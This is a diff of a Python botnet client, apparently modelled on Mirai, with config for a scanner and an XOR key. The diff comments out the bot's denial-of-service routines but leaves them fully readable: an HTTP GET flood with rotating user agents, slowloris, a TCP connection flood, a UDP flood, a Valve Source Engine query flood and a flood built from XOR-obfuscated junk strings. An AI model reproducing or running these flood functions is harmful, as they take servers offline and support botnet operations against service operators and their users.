@@ -33,189 +33,188 @@ single_instance_port = 42026#You should knew this if u used mirai.
 scan_th              = 50#Scanner threads
 key                  = "asdfghjkloiuytresxcvbnmliuytf"#xor key, don't edit it if u don't know wtf is this
 
-useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
-			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
-			"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-			"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
-			"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
-			"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
-			"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
-			"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
-			"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-			"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
-			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
-			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
-			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
-			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
-			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
-			"Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
-			"Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
-			"Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
-			"Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
-			"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",]
+#!useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
+#!			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
+#!			"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+#!			"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
+#!			"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
+#!			"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
+#!			"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
+#!			"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
+#!			"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+#!			"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+#!			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
+#!			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
+#!			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
+#!			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
+#!			"Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
+#!			"Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
+#!			"Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
+#!			"Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
+#!			"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",]
 
-acceptall = [
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-		"Accept-Encoding: gzip, deflate\r\n",
-		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
-		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
-		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
-		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
-		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
-		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-		"Accept: text/html, application/xhtml+xml",
-		"Accept-Language: en-US,en;q=0.5\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
-		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
+#!acceptall = [
+#!		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+#!		"Accept-Encoding: gzip, deflate\r\n",
+#!		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+#!		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
+#!		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+#!		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+#!		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+#!		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+#!		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
+#!		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
+#!		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+#!		"Accept: text/html, application/xhtml+xml",
+#!		"Accept-Language: en-US,en;q=0.5\r\n",
+#!		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
+#!		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
 
 strings = "asdfghlqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM1234567890"
 stop    = False#threads control
 scan    = True#Default turn the scanner on
 
-def HTTP(ip, port, path):
-	global stop
-	while True:
-		if stop :
-			break
-		try:
-			s=socket.socket()
-			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
-			s.settimeout(5)
-			s.connect((str(ip), int(port)))
-			if int(port) == 443:
-				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=ip)
-			connection = "Connection: Keep-Alive\r\n"
-			useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
-			accept = random.choice(acceptall)
-			get_host = "GET "+path+"?"+str(random.randint(0,50000))
-			for _ in range(10):
-				get_host += strings[random.randint(0,len(strings))]
-			try:
-				for _ in range(200):
-					get_host += str(random.randint(0,50000))+ " HTTP/1.1\r\nHost: " + ip + "\r\n"
-					http = get_host + useragent + accept + connection + "\r\n"
-					s.send(str.encode(http))
-			except:
-				s.close()
-		except:
-			pass
+#!def HTTP(ip, port, path):
+#!	global stop
+#!	while True:
+#!		if stop :
+#!			break
+#!		try:
+#!			s=socket.socket()
+#!			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+#!			s.settimeout(5)
+#!			s.connect((str(ip), int(port)))
+#!			if int(port) == 443:
+#!				ctx = ssl.SSLContext()
+#!				s = ctx.wrap_socket(s,server_hostname=ip)
+#!			connection = "Connection: Keep-Alive\r\n"
+#!			useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+#!			accept = random.choice(acceptall)
+#!			get_host = "GET "+path+"?"+str(random.randint(0,50000))
+#!			for _ in range(10):
+#!				get_host += strings[random.randint(0,len(strings))]
+#!			try:
+#!				for _ in range(200):
+#!					get_host += str(random.randint(0,50000))+ " HTTP/1.1\r\nHost: " + ip + "\r\n"
+#!					http = get_host + useragent + accept + connection + "\r\n"
+#!					s.send(str.encode(http))
+#!			except:
+#!				s.close()
+#!		except:
+#!			pass
 
-def SLOW(ip, port, conns, path):#slowloris, reference from https:#github.com/gkbrk/slowloris
-	global stop
-	socket_list = []
-	get_host = "GET "+path+"?"+str(random.randint(0,50000))+" HTTP/1.1\r\nHost: " + ip + "\r\n"
-	connection = "Connection: Keep-Alive\r\n"
-	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
-	accept = random.choice(acceptall)
-	header = get_host + useragent + accept + connection
-	for _ in range(int(conns)):
-		try:
-			if stop:#if stop=False then countine
-				break
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((str(ip), int(port)))
-			if int(port) == 443:
-				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=ip)
-			s.send(str.encode(header))
-			socket_list.append(s)
-		except:
-			pass
-	while True:#loop
-		if stop:#if stop=False then countine
-			break
-		for s in list(socket_list):
-			try:
-				s.send("X-a: {}\r\n".format(random.randint(1, 50000)).encode("utf-8"))
-			except socket.error:
-				socket_list.remove(s)
-		for _ in range(int(conns)-len(socket_list)):
-			try:
-				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-				s.connect((str(ip), int(port)))
-				if port == 443:
-					s = ssl.wrap_socket(s)
-				s.send(str.encode(header))
-				socket_list.append(s)
-			except:
-				pass
+#!def SLOW(ip, port, conns, path):#slowloris, reference from https:#github.com/gkbrk/slowloris
+#!	global stop
+#!	socket_list = []
+#!	get_host = "GET "+path+"?"+str(random.randint(0,50000))+" HTTP/1.1\r\nHost: " + ip + "\r\n"
+#!	connection = "Connection: Keep-Alive\r\n"
+#!	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
+#!	accept = random.choice(acceptall)
+#!	header = get_host + useragent + accept + connection
+#!	for _ in range(int(conns)):
+#!		try:
+#!			if stop:#if stop=False then countine
+#!				break
+#!			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#!			s.connect((str(ip), int(port)))
+#!			if int(port) == 443:
+#!				ctx = ssl.SSLContext()
+#!				s = ctx.wrap_socket(s,server_hostname=ip)
+#!			s.send(str.encode(header))
+#!			socket_list.append(s)
+#!		except:
+#!			pass
+#!	while True:#loop
+#!		if stop:#if stop=False then countine
+#!			break
+#!		for s in list(socket_list):
+#!			try:
+#!				s.send("X-a: {}\r\n".format(random.randint(1, 50000)).encode("utf-8"))
+#!			except socket.error:
+#!				socket_list.remove(s)
+#!		for _ in range(int(conns)-len(socket_list)):
+#!			try:
+#!				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#!				s.connect((str(ip), int(port)))
+#!				if port == 443:
+#!					s = ssl.wrap_socket(s)
+#!				s.send(str.encode(header))
+#!				socket_list.append(s)
+#!			except:
+#!				pass
+#!
+#!def CC(ip, port):#connection flood
+#!	global stop
+#!	while True:
+#!		if stop :
+#!			break
+#!		try:
+#!			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#!			s.connect((str(ip),int(port)))
+#!			if int(port) == 443:
+#!				ctx = ssl.SSLContext()
+#!				s = ctx.wrap_socket(s,server_hostname=ip)
+#!			s.send("\000".encode())
+#!			s.close()
+#!		except:
+#!			s.close()
 
-def CC(ip, port):#connection flood
-	global stop
-	while True:
-		if stop :
-			break
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((str(ip),int(port)))
-			if int(port) == 443:
-				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=ip)
-			s.send("\000".encode())
-			s.close()
-		except:
-			s.close()
+#!def UDP(ip, port, size):#udp flood(best size is 512-1024, if size too big router may filter it)
+#!	global stop
+#!	while True:
+#!		if stop :
+#!			break
+#!		sendip=(str(ip),int(port))
+#!		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+#!		try:
+#!			for _ in range(200):
+#!				udpbytes = random._urandom(int(size))
+#!				s.sendto(udpbytes, sendip)
+#!			s.close()
+#!		except:
+#!			s.close()
 
-def UDP(ip, port, size):#udp flood(best size is 512-1024, if size too big router may filter it)
-	global stop
-	while True:
-		if stop :
-			break
-		sendip=(str(ip),int(port))
-		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-		try:
-			for _ in range(200):
-				udpbytes = random._urandom(int(size))
-				s.sendto(udpbytes, sendip)
-			s.close()
-		except:
-			s.close()
-
-def VSE(ip, port):#VSE flood, for Valve servers
-	global stop
-	while True:
-		if stop :
-			break
-		sendip=(str(ip),int(port))
-		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-		try:
-			for _ in range(200):
-				s.sendto('\xFF\xFF\xFF\xFFTSource Engine Query\x00'.encode(), sendip)
+#!def VSE(ip, port):#VSE flood, for Valve servers
+#!	global stop
+#!	while True:
+#!		if stop :
+#!			break
+#!		sendip=(str(ip),int(port))
+#!		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+#!		try:
+#!			for _ in range(200):
+#!				s.sendto('\xFF\xFF\xFF\xFFTSource Engine Query\x00'.encode(), sendip)
 				
-			s.close()
-		except:
-			s.close()
+#!			s.close()
+#!		except:
+#!			s.close()
 
-def STD(ip, port):#STD flood, UDP flood with randomized junk strings
-	global stop
-	while True:
-		if stop :
-			break
-		sendip=(str(ip),int(port))
-		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-		junk_strings = [ #random junk strings used for the STD attacks, feel free to add/delete some
-			xor_dec('IBwdBwoJSgkDGwcQDVU=', key),
-			xor_dec('LBIAA0cKE0siChEAClRURT8dBhkMX19f', key),
-			xor_dec('BgEBAxMSSh8DTyglLQNBRU9L', key),
-			xor_dec('CQcQFhRSRUQLBh0dDBZcBhwVTDgHFhgWEw8D', key),
-			xor_dec('CFMDCRNIAg4AAwhVGxsdERYKEA==', key),
-			xor_dec('MicgRgEEBQQITwsUGw1TRFI=', key),
-			xor_dec('CRIMB0cKCwUIGAABEVQVClMaEQQQHB8eGwcLBhQTARYUFRoY', key),
-			xor_dec('JTcLNUcJHh8NDAJU', key),
-			xor_dec('IBwdBwoJSgkDGwcQDVQAChATEFc=', key)
-                ]
+#!def STD(ip, port):#STD flood, UDP flood with randomized junk strings
+#!	global stop
+#!	while True:
+#!		if stop :
+#!			break
+#!		sendip=(str(ip),int(port))
+#!		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+#!		junk_strings = [ #random junk strings used for the STD attacks, feel free to add/delete some
+#!			xor_dec('IBwdBwoJSgkDGwcQDVU=', key),
+#!			xor_dec('LBIAA0cKE0siChEAClRURT8dBhkMX19f', key),
+#!			xor_dec('BgEBAxMSSh8DTyglLQNBRU9L', key),
+#!			xor_dec('CQcQFhRSRUQLBh0dDBZcBhwVTDgHFhgWEw8D', key),
+#!			xor_dec('CFMDCRNIAg4AAwhVGxsdERYKEA==', key),
+#!			xor_dec('MicgRgEEBQQITwsUGw1TRFI=', key),
+#!			xor_dec('CRIMB0cKCwUIGAABEVQVClMaEQQQHB8eGwcLBhQTARYUFRoY', key),
+#!			xor_dec('JTcLNUcJHh8NDAJU', key),
+#!			xor_dec('IBwdBwoJSgkDGwcQDVQAChATEFc=', key)
+#!		]
 		
-		try:
-			for _ in range(200):
-				s.sendto(random.choice(junk_strings).encode(), sendip)
-				
-			s.close()
-		except:
-			s.close()
+#!		try:
+#!			for _ in range(200):
+#!				s.sendto(random.choice(junk_strings).encode(), sendip)
+#!				
+#!			s.close()
+#!		except:
+#!			s.close()
 
 def send_back(ip):
 	try:
